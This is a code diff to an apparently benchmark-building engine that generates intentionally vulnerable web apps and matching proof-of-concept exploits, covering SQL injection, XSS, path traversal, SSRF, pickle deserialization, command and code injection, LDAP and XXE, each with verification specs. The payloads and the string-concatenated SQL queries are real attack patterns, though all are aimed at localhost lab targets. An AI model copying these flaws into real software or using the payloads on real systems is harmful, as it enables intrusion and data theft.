+                "    url = args.base_url.rstrip('/') + '/echo?name=' + quote(args.payload)",
                 "    request = Request(url, method='GET')",
                 "    with urlopen(request, timeout=5) as response:",
                 "        body = response.read().decode('utf-8', errors='ignore')",
-                "    if PAYLOAD in body:",
+                "    if args.payload in body:",
                 "        print(SUCCESS_SIGNATURE)",
                 "        if FLAG_TOKEN:",
                 "            print(FLAG_TOKEN)",
@@ -1901,6 +2565,30 @@ class SynthesisEngine:
                 "",
             ]
         )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=flag_token,
+            negative_text_markers=[
+                "Payload was not reflected verbatim",
+                "payload is not executable script markup",
+            ],
+            negative_controls=[
+                {
+                    "name": "plain-text-reflection",
+                    "expect_success": False,
+                    "payload": "hello",
+                    "rationale": "plain text reflection should not count as XSS exploit success",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "img-onerror",
+                    "expect_success": True,
+                    "payload": "<img src=x onerror=alert(1)>",
+                }
+            ],
+            metamorphic_rationale="alternative active script payloads should remain unsanitized and reflected",
+        )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -1911,6 +2599,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -2010,13 +2699,14 @@ class SynthesisEngine:
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {effective_flag!r}",
                 "DEFAULT_BASE = 'http://127.0.0.1:8000'",
-                "PAYLOAD = '../secret.txt'",
+                "DEFAULT_PAYLOAD = '../secret.txt'",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
-                "    url = args.base_url.rstrip('/') + '/download?path=' + quote(PAYLOAD)",
+                "    url = args.base_url.rstrip('/') + '/download?path=' + quote(args.payload)",
                 "    request = Request(url, method='GET')",
                 "    try:",
                 "        with urlopen(request, timeout=5) as response:",
@@ -2036,6 +2726,27 @@ class SynthesisEngine:
                 "",
             ]
         )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            negative_text_markers=["Traversal payload did not reach protected file"],
+            negative_controls=[
+                {
+                    "name": "public-note",
+                    "expect_success": False,
+                    "payload": "note.txt",
+                    "rationale": "reading a public file should not count as traversal exploit success",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "dot-slash-variant",
+                    "expect_success": True,
+                    "payload": ".././secret.txt",
+                }
+            ],
+            metamorphic_rationale="equivalent parent-directory traversal variants should still reach the protected file",
+        )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -2046,6 +2757,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -2144,12 +2856,22 @@ class SynthesisEngine:
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {effective_flag!r}",
                 "DEFAULT_BASE = 'http://127.0.0.1:8000'",
+                "DEFAULT_PAYLOAD = '/metadata'",
+                "",
+                "def _resolve_target(base_url: str, payload: str) -> str:",
+                "    target = str(payload or '').strip() or DEFAULT_PAYLOAD",
+                "    if target.startswith(('http://', 'https://')):",
+                "        return target",
+                "    if not target.startswith('/'):",
+                "        target = '/' + target",
+                "    return base_url.rstrip('/') + target",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
-                "    target = args.base_url.rstrip('/') + '/metadata'",
+                "    target = _resolve_target(args.base_url, args.payload)",
                 "    url = args.base_url.rstrip('/') + '/fetch?url=' + quote(target, safe=':/?=&')",
                 "    request = Request(url, method='GET')",
                 "    try:",
@@ -2175,6 +2897,30 @@ class SynthesisEngine:
                 "",
             ]
         )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            negative_text_markers=[
+                "Loopback fetch did not reach metadata endpoint",
+                "SSRF response body was not JSON",
+            ],
+            negative_controls=[
+                {
+                    "name": "health-endpoint",
+                    "expect_success": False,
+                    "payload": "/health",
+                    "rationale": "fetching a benign local endpoint should not count as SSRF exploit success",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "metadata-query-variant",
+                    "expect_success": True,
+                    "payload": "/metadata?from=probe",
+                }
+            ],
+            metamorphic_rationale="equivalent loopback metadata URLs should preserve SSRF exploit success",
+        )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -2185,6 +2931,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -2285,18 +3032,23 @@ class SynthesisEngine:
                 "",
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {effective_flag!r}",
+                "DEFAULT_PAYLOAD = 'cat /tmp/deser-flag.txt'",
                 "",
                 "class Exploit:",
+                "    def __init__(self, command: str):",
+                "        self.command = command",
+                "",
                 "    def __reduce__(self):",
                 "        import subprocess",
-                "        return (subprocess.getoutput, ('cat /tmp/deser-flag.txt',))",
+                "        return (subprocess.getoutput, (self.command,))",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default='http://127.0.0.1:8000')",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
                 "    target = args.base_url.rstrip('/') + '/deserialize'",
-                "    payload = pickle.dumps(Exploit(), protocol=pickle.HIGHEST_PROTOCOL)",
+                "    payload = pickle.dumps(Exploit(args.payload), protocol=pickle.HIGHEST_PROTOCOL)",
                 "    request = Request(target, data=payload, method='POST')",
                 "    request.add_header('Content-Type', 'application/octet-stream')",
                 "    try:",
@@ -2322,6 +3074,27 @@ class SynthesisEngine:
                 "",
             ]
         )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            negative_text_markers=["Deserialization payload did not reach protected sink"],
+            negative_controls=[
+                {
+                    "name": "safe-echo",
+                    "expect_success": False,
+                    "payload": "echo safe",
+                    "rationale": "benign deserialization gadget output should not disclose the protected flag",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "printf-flag",
+                    "expect_success": True,
+                    "payload": "printf " + effective_flag,
+                }
+            ],
+            metamorphic_rationale="equivalent gadget commands that print the protected flag should preserve exploit success",
+        )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -2332,6 +3105,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -2350,7 +3124,171 @@ class SynthesisEngine:
         flag_token: str,
     ) -> Dict[str, Any]:
         effective_flag = flag_token or "FLAG-sqli-demo-token"
-        if self._fastapi_stack(stack):
+        design_targets = self._design_brief_dependency_targets()
+        db_targets = design_targets.get("db_targets") if isinstance(design_targets.get("db_targets"), list) else []
+        runtime_db = next(
+            (
+                str(item).strip().lower()
+                for item in db_targets
+                if isinstance(item, str) and str(item).strip().lower() in {"sqlite", "mysql", "mariadb", "postgres", "postgresql"}
+            ),
+            "sqlite",
+        )
+        if runtime_db == "postgresql":
+            runtime_db = "postgres"
+        external_db = runtime_db in {"mysql", "mariadb", "postgres"}
+        extra_files: List[Dict[str, Any]] = []
+        schema_sql = ""
+        if self._fastapi_stack(stack) and external_db and runtime_db in {"mysql", "mariadb"}:
+            schema_sql = "\n".join(
+                [
+                    "CREATE TABLE IF NOT EXISTS users (",
+                    "    id INTEGER PRIMARY KEY AUTO_INCREMENT,",
+                    "    username VARCHAR(255),",
+                    "    password VARCHAR(255)",
+                    ");",
+                    "DELETE FROM users;",
+                    "INSERT INTO users (username, password) VALUES ('admin', 'secret');",
+                    "INSERT INTO users (username, password) VALUES ('guest', 'guest');",
+                    "",
+                ]
+            )
+            app_content = "\n".join(
+                [
+                    "import os",
+                    "from pathlib import Path",
+                    "",
+                    "import pymysql",
+                    "from fastapi import FastAPI, Query",
+                    "",
+                    "app = FastAPI()",
+                    f"FLAG_TOKEN = {effective_flag!r}",
+                    "DB_HOST = os.environ.get('DB_HOST', 'db-internal')",
+                    "DB_PORT = int(os.environ.get('DB_PORT', '3306'))",
+                    "DB_USER = os.environ.get('DB_USER', 'sqli')",
+                    "DB_PASSWORD = os.environ.get('DB_PASSWORD', 'sqli_pw')",
+                    "DB_NAME = os.environ.get('DB_NAME', 'sqliapp')",
+                    "SCHEMA_PATH = Path(__file__).with_name('schema.sql')",
+                    "",
+                    "def get_conn():",
+                    "    return pymysql.connect(",
+                    "        host=DB_HOST,",
+                    "        port=DB_PORT,",
+                    "        user=DB_USER,",
+                    "        password=DB_PASSWORD,",
+                    "        database=DB_NAME,",
+                    "        autocommit=True,",
+                    "        cursorclass=pymysql.cursors.DictCursor,",
+                    "    )",
+                    "",
+                    "def init_db() -> None:",
+                    "    conn = get_conn()",
+                    "    statements = [item.strip() for item in SCHEMA_PATH.read_text(encoding='utf-8').split(';') if item.strip()]",
+                    "    with conn.cursor() as cur:",
+                    "        for statement in statements:",
+                    "            cur.execute(statement)",
+                    "    conn.close()",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return {'status': 'ok'}",
+                    "",
+                    "@app.get('/login')",
+                    "def login(",
+                    "    username: str = Query(default=''),",
+                    "    password: str = Query(default=''),",
+                    "):",
+                    "    query = \"SELECT id, username FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"",
+                    "    conn = get_conn()",
+                    "    with conn.cursor() as cur:",
+                    "        cur.execute(query)",
+                    "        rows = cur.fetchall()",
+                    "    conn.close()",
+                    "    compromised = any(str(row.get('username')) == 'admin' for row in rows)",
+                    "    return {'success': bool(rows), 'rows': rows, 'query': query, 'flag': FLAG_TOKEN if compromised else None}",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    import uvicorn",
+                    "    init_db()",
+                    f"    uvicorn.run(app, host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "fastapi==0.115.0\nuvicorn==0.30.6\npymysql==1.1.1\n"
+        elif self._fastapi_stack(stack) and external_db and runtime_db == "postgres":
+            schema_sql = "\n".join(
+                [
+                    "CREATE TABLE IF NOT EXISTS users (",
+                    "    id SERIAL PRIMARY KEY,",
+                    "    username TEXT,",
+                    "    password TEXT",
+                    ");",
+                    "DELETE FROM users;",
+                    "INSERT INTO users (username, password) VALUES ('admin', 'secret');",
+                    "INSERT INTO users (username, password) VALUES ('guest', 'guest');",
+                    "",
+                ]
+            )
+            app_content = "\n".join(
+                [
+                    "import os",
+                    "from pathlib import Path",
+                    "",
+                    "import psycopg2",
+                    "from psycopg2.extras import RealDictCursor",
+                    "from fastapi import FastAPI, Query",
+                    "",
+                    "app = FastAPI()",
+                    f"FLAG_TOKEN = {effective_flag!r}",
+                    "DB_HOST = os.environ.get('DB_HOST', 'db-internal')",
+                    "DB_PORT = int(os.environ.get('DB_PORT', '5432'))",
+                    "DB_USER = os.environ.get('DB_USER', 'sqli')",
+                    "DB_PASSWORD = os.environ.get('DB_PASSWORD', 'sqli_pw')",
+                    "DB_NAME = os.environ.get('DB_NAME', 'sqliapp')",
+                    "SCHEMA_PATH = Path(__file__).with_name('schema.sql')",
+                    "",
+                    "def get_conn():",
+                    "    conn = psycopg2.connect(host=DB_HOST, port=DB_PORT, user=DB_USER, password=DB_PASSWORD, dbname=DB_NAME)",
+                    "    conn.autocommit = True",
+                    "    return conn",
+                    "",
+                    "def init_db() -> None:",
+                    "    conn = get_conn()",
+                    "    cur = conn.cursor()",
+                    "    statements = [item.strip() for item in SCHEMA_PATH.read_text(encoding='utf-8').split(';') if item.strip()]",
+                    "    for statement in statements:",
+                    "        cur.execute(statement)",
+                    "    cur.close()",
+                    "    conn.close()",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return {'status': 'ok'}",
+                    "",
+                    "@app.get('/login')",
+                    "def login(",
+                    "    username: str = Query(default=''),",
+                    "    password: str = Query(default=''),",
+                    "):",
+                    "    query = \"SELECT id, username FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"",
+                    "    conn = get_conn()",
+                    "    cur = conn.cursor(cursor_factory=RealDictCursor)",
+                    "    cur.execute(query)",
+                    "    rows = cur.fetchall()",
+                    "    cur.close()",
+                    "    conn.close()",
+                    "    compromised = any(str(row.get('username')) == 'admin' for row in rows)",
+                    "    return {'success': bool(rows), 'rows': rows, 'query': query, 'flag': FLAG_TOKEN if compromised else None}",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    import uvicorn",
+                    "    init_db()",
+                    f"    uvicorn.run(app, host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "fastapi==0.115.0\nuvicorn==0.30.6\npsycopg2-binary==2.9.9\n"
+        elif self._fastapi_stack(stack):
             app_content = "\n".join(
                 [
                     "from pathlib import Path",
@@ -2403,6 +3341,151 @@ class SynthesisEngine:
                 ]
             )
             requirements_content = "fastapi==0.115.0\nuvicorn==0.30.6\n"
+        elif external_db and runtime_db in {"mysql", "mariadb"}:
+            schema_sql = "\n".join(
+                [
+                    "CREATE TABLE IF NOT EXISTS users (",
+                    "    id INTEGER PRIMARY KEY AUTO_INCREMENT,",
+                    "    username VARCHAR(255),",
+                    "    password VARCHAR(255)",
+                    ");",
+                    "DELETE FROM users;",
+                    "INSERT INTO users (username, password) VALUES ('admin', 'secret');",
+                    "INSERT INTO users (username, password) VALUES ('guest', 'guest');",
+                    "",
+                ]
+            )
+            app_content = "\n".join(
+                [
+                    "import os",
+                    "from pathlib import Path",
+                    "",
+                    "import pymysql",
+                    "from flask import Flask, jsonify, request",
+                    "",
+                    "app = Flask(__name__)",
+                    f"FLAG_TOKEN = {effective_flag!r}",
+                    "DB_HOST = os.environ.get('DB_HOST', 'db-internal')",
+                    "DB_PORT = int(os.environ.get('DB_PORT', '3306'))",
+                    "DB_USER = os.environ.get('DB_USER', 'sqli')",
+                    "DB_PASSWORD = os.environ.get('DB_PASSWORD', 'sqli_pw')",
+                    "DB_NAME = os.environ.get('DB_NAME', 'sqliapp')",
+                    "SCHEMA_PATH = Path(__file__).with_name('schema.sql')",
+                    "",
+                    "def get_conn():",
+                    "    return pymysql.connect(",
+                    "        host=DB_HOST,",
+                    "        port=DB_PORT,",
+                    "        user=DB_USER,",
+                    "        password=DB_PASSWORD,",
+                    "        database=DB_NAME,",
+                    "        autocommit=True,",
+                    "        cursorclass=pymysql.cursors.DictCursor,",
+                    "    )",
+                    "",
+                    "def init_db() -> None:",
+                    "    conn = get_conn()",
+                    "    statements = [item.strip() for item in SCHEMA_PATH.read_text(encoding='utf-8').split(';') if item.strip()]",
+                    "    with conn.cursor() as cur:",
+                    "        for statement in statements:",
+                    "            cur.execute(statement)",
+                    "    conn.close()",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return jsonify({'status': 'ok'})",
+                    "",
+                    "@app.get('/login')",
+                    "def login():",
+                    "    username = request.args.get('username', '')",
+                    "    password = request.args.get('password', '')",
+                    "    query = \"SELECT id, username FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"",
+                    "    conn = get_conn()",
+                    "    with conn.cursor() as cur:",
+                    "        cur.execute(query)",
+                    "        rows = cur.fetchall()",
+                    "    conn.close()",
+                    "    compromised = any(str(row.get('username')) == 'admin' for row in rows)",
+                    "    return jsonify({'success': bool(rows), 'rows': rows, 'query': query, 'flag': FLAG_TOKEN if compromised else None})",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    init_db()",
+                    f"    app.run(host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "Flask==3.0.0\npymysql==1.1.1\n"
+        elif external_db and runtime_db == "postgres":
+            schema_sql = "\n".join(
+                [
+                    "CREATE TABLE IF NOT EXISTS users (",
+                    "    id SERIAL PRIMARY KEY,",
+                    "    username TEXT,",
+                    "    password TEXT",
+                    ");",
+                    "DELETE FROM users;",
+                    "INSERT INTO users (username, password) VALUES ('admin', 'secret');",
+                    "INSERT INTO users (username, password) VALUES ('guest', 'guest');",
+                    "",
+                ]
+            )
+            app_content = "\n".join(
+                [
+                    "import os",
+                    "from pathlib import Path",
+                    "",
+                    "import psycopg2",
+                    "from psycopg2.extras import RealDictCursor",
+                    "from flask import Flask, jsonify, request",
+                    "",
+                    "app = Flask(__name__)",
+                    f"FLAG_TOKEN = {effective_flag!r}",
+                    "DB_HOST = os.environ.get('DB_HOST', 'db-internal')",
+                    "DB_PORT = int(os.environ.get('DB_PORT', '5432'))",
+                    "DB_USER = os.environ.get('DB_USER', 'sqli')",
+                    "DB_PASSWORD = os.environ.get('DB_PASSWORD', 'sqli_pw')",
+                    "DB_NAME = os.environ.get('DB_NAME', 'sqliapp')",
+                    "SCHEMA_PATH = Path(__file__).with_name('schema.sql')",
+                    "",
+                    "def get_conn():",
+                    "    conn = psycopg2.connect(host=DB_HOST, port=DB_PORT, user=DB_USER, password=DB_PASSWORD, dbname=DB_NAME)",
+                    "    conn.autocommit = True",
+                    "    return conn",
+                    "",
+                    "def init_db() -> None:",
+                    "    conn = get_conn()",
+                    "    cur = conn.cursor()",
+                    "    statements = [item.strip() for item in SCHEMA_PATH.read_text(encoding='utf-8').split(';') if item.strip()]",
+                    "    for statement in statements:",
+                    "        cur.execute(statement)",
+                    "    cur.close()",
+                    "    conn.close()",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return jsonify({'status': 'ok'})",
+                    "",
+                    "@app.get('/login')",
+                    "def login():",
+                    "    username = request.args.get('username', '')",
+                    "    password = request.args.get('password', '')",
+                    "    query = \"SELECT id, username FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"",
+                    "    conn = get_conn()",
+                    "    cur = conn.cursor(cursor_factory=RealDictCursor)",
+                    "    cur.execute(query)",
+                    "    rows = cur.fetchall()",
+                    "    cur.close()",
+                    "    conn.close()",
+                    "    compromised = any(str(row.get('username')) == 'admin' for row in rows)",
+                    "    return jsonify({'success': bool(rows), 'rows': rows, 'query': query, 'flag': FLAG_TOKEN if compromised else None})",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    init_db()",
+                    f"    app.run(host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "Flask==3.0.0\npsycopg2-binary==2.9.9\n"
         else:
             app_content = "\n".join(
                 [
@@ -2487,6 +3570,15 @@ class SynthesisEngine:
                 "",
             ]
         )
+        if external_db and schema_sql:
+            extra_files.append(
+                {
+                    "path": "schema.sql",
+                    "role": "schema",
+                    "description": f"{runtime_db} fallback schema and seed statements.",
+                    "content": schema_sql,
+                }
+            )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -2497,9 +3589,24 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            extra_files=extra_files,
         )
+        if external_db:
+            run = manifest.get("run") if isinstance(manifest.get("run"), dict) else {}
+            env = run.get("env") if isinstance(run.get("env"), dict) else {}
+            env.setdefault("DB_HOST", "db-internal")
+            env.setdefault("DB_PORT", "3306" if runtime_db in {"mysql", "mariadb"} else "5432")
+            env.setdefault("DB_USER", "sqli")
+            env.setdefault("DB_PASSWORD", "sqli_pw")
+            env.setdefault("DB_NAME", "sqliapp")
+            run["env"] = env
+            manifest["run"] = run
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
+        if external_db:
+            metadata["target_db"] = runtime_db
+            metadata["target_sidecars"] = [runtime_db]
+            metadata.setdefault("target_topology", str(design_targets.get("selected_topology") or "").strip().lower() or "service_plus_sidecar")
         manifest["metadata"] = metadata
         return manifest
 
@@ -2575,13 +3682,14 @@ class SynthesisEngine:
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {effective_flag!r}",
                 "DEFAULT_BASE = 'http://127.0.0.1:8000'",
-                "DEFAULT_PARAMS = {'cmd': 'echo ' + FLAG_TOKEN}",
+                "DEFAULT_PAYLOAD = 'echo ' + FLAG_TOKEN",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
-                "    url = args.base_url.rstrip('/') + '/run?' + urlencode(DEFAULT_PARAMS)",
+                "    url = args.base_url.rstrip('/') + '/run?' + urlencode({'cmd': args.payload})",
                 "    request = Request(url, method='GET')",
                 "    with urlopen(request, timeout=5) as response:",
                 "        payload = json.loads(response.read().decode('utf-8', errors='ignore'))",
@@ -2597,6 +3705,27 @@ class SynthesisEngine:
                 "",
             ]
         )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            negative_text_markers=["Command injection payload did not reach the shell sink"],
+            negative_controls=[
+                {
+                    "name": "safe-echo",
+                    "expect_success": False,
+                    "payload": "echo safe",
+                    "rationale": "benign shell input should not leak the exploit flag",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "printf-flag",
+                    "expect_success": True,
+                    "payload": "printf " + effective_flag,
+                }
+            ],
+            metamorphic_rationale="different shell commands that print the same flag should preserve exploit success",
+        )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -2607,6 +3736,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -2683,13 +3813,14 @@ class SynthesisEngine:
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {effective_flag!r}",
                 "DEFAULT_BASE = 'http://127.0.0.1:8000'",
-                "DEFAULT_PARAMS = {'code': 'FLAG_TOKEN'}",
+                "DEFAULT_PAYLOAD = 'FLAG_TOKEN'",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
-                "    url = args.base_url.rstrip('/') + '/eval?' + urlencode(DEFAULT_PARAMS)",
+                "    url = args.base_url.rstrip('/') + '/eval?' + urlencode({'code': args.payload})",
                 "    request = Request(url, method='GET')",
                 "    with urlopen(request, timeout=5) as response:",
                 "        payload = json.loads(response.read().decode('utf-8', errors='ignore'))",
@@ -2705,6 +3836,27 @@ class SynthesisEngine:
                 "",
             ]
         )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            negative_text_markers=["Code injection payload did not reach eval sink"],
+            negative_controls=[
+                {
+                    "name": "literal-zero",
+                    "expect_success": False,
+                    "payload": "0",
+                    "rationale": "non-exploit code should not evaluate to the protected flag value",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "str-flag-token",
+                    "expect_success": True,
+                    "payload": "str(FLAG_TOKEN)",
+                }
+            ],
+            metamorphic_rationale="equivalent expressions that resolve to the protected flag should preserve exploit success",
+        )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -2715,6 +3867,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -2803,13 +3956,14 @@ class SynthesisEngine:
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {effective_flag!r}",
                 "DEFAULT_BASE = 'http://127.0.0.1:8000'",
-                "DEFAULT_PARAMS = {'user': '*)(uid=*)'}",
+                "DEFAULT_PAYLOAD = '*)(uid=*)'",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
-                "    url = args.base_url.rstrip('/') + '/search?' + urlencode(DEFAULT_PARAMS)",
+                "    url = args.base_url.rstrip('/') + '/search?' + urlencode({'user': args.payload})",
                 "    request = Request(url, method='GET')",
                 "    with urlopen(request, timeout=5) as response:",
                 "        payload = json.loads(response.read().decode('utf-8', errors='ignore'))",
@@ -2826,6 +3980,27 @@ class SynthesisEngine:
                 "",
             ]
         )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            negative_text_markers=["LDAP injection payload did not bypass the directory filter"],
+            negative_controls=[
+                {
+                    "name": "guest-user",
+                    "expect_success": False,
+                    "payload": "guest",
+                    "rationale": "benign user lookup should not disclose the admin flag",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "wildcard-only",
+                    "expect_success": True,
+                    "payload": "*",
+                }
+            ],
+            metamorphic_rationale="equivalent wildcard LDAP filter payloads should preserve bypass success",
+        )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -2836,6 +4011,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -2923,13 +4099,18 @@ class SynthesisEngine:
                 f"SUCCESS_SIGNATURE = {success_signature!r}",
                 f"FLAG_TOKEN = {effective_flag!r}",
                 "DEFAULT_BASE = 'http://127.0.0.1:8000'",
-                "PAYLOAD = \"\"\"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///tmp/xxe-secret.txt'>]><root>&xxe;</root>\"\"\"",
+                "DEFAULT_PAYLOAD = 'file:///tmp/xxe-secret.txt'",
+                "",
+                "def _build_xml(target: str) -> str:",
+                "    return f\"<!DOCTYPE root [<!ENTITY xxe SYSTEM '{target}'>]><root>&xxe;</root>\"",
                 "",
                 "def main() -> int:",
                 "    parser = argparse.ArgumentParser()",
                 "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
                 "    args = parser.parse_args()",
-                "    request = Request(args.base_url.rstrip('/') + '/parse', data=PAYLOAD.encode('utf-8'), method='POST')",
+                "    xml_payload = _build_xml(args.payload)",
+                "    request = Request(args.base_url.rstrip('/') + '/parse', data=xml_payload.encode('utf-8'), method='POST')",
                 "    request.add_header('Content-Type', 'application/xml')",
                 "    with urlopen(request, timeout=5) as response:",
                 "        payload = json.loads(response.read().decode('utf-8', errors='ignore'))",
@@ -2945,6 +4126,27 @@ class SynthesisEngine:
                 "",
             ]
         )
+        verification_spec = self._payload_replay_verification_spec(
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            negative_text_markers=["XXE payload did not resolve external entity"],
+            negative_controls=[
+                {
+                    "name": "hostname-file",
+                    "expect_success": False,
+                    "payload": "file:///etc/hostname",
+                    "rationale": "reading an unrelated local file should not count as XXE exploit success",
+                }
+            ],
+            metamorphic_cases=[
+                {
+                    "name": "dot-path-secret",
+                    "expect_success": True,
+                    "payload": "file:///tmp/./xxe-secret.txt",
+                }
+            ],
+            metamorphic_rationale="equivalent local file entity targets should preserve XXE exploit success",
+        )
         manifest = self._fallback_manifest_from_parts(
             vuln_id=normalized_vuln or vuln_id,
             stack=stack,
@@ -2955,6 +4157,7 @@ class SynthesisEngine:
             requirements_content=requirements_content,
             app_content=app_content,
             poc_content=poc_content,
+            verification_spec=verification_spec,
         )
         metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
         metadata["materializer"] = "minimal_dynamic"
@@ -3000,7 +4203,7 @@ class SynthesisEngine:
                     "        return JSONResponse({'success': False, 'error': 'auth required'}, status_code=403)",
                     "    # Intentional CSRF flaw: cookie-authenticated state change with no CSRF token validation.",
                     "    app.state.balance -= amount",
-                    "    return {'success': True, 'balance': app.state.balance, 'flag': FLAG_TOKEN}",
+                    "    return {'success': True, 'balance': app.state.balance, 'flag': FLAG_TOKEN if amount > 0 else None}",
                     "",
                     "if __name__ == '__main__':",
                     "    import uvicorn",
@@ -3036,7 +4239,7 @@ class SynthesisEngine:
                     "    # Intentional CSRF flaw: cookie-authenticated state change with no CSRF token validation.",
                     "    amount = int(request.args.get('amount', '100'))",
                     "    BALANCE['value'] -= amount",
